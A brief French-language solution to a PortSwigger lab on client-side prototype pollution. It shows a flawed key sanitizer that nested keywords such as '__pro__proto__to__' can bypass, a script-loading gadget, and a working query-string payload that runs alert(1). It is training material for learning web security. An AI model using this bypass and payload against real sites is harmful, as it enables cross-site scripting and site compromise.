# Lab

https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization

## Solution

Il y a une erreur dans la facon de sataniser les paramètres :

```js
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

Si on passe `__pro__proto__to__` comme paramètre, la fonction `sanitizeKey` va le transformer en `__proto__`.

Ensuite on peut utiliser la pollution pour exploiter l'insertion de `script` :

```js
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

On peut donc utiliser la payload suivante :

```
?__pro__proto__to__[transport_url]=data:,alert(1);
```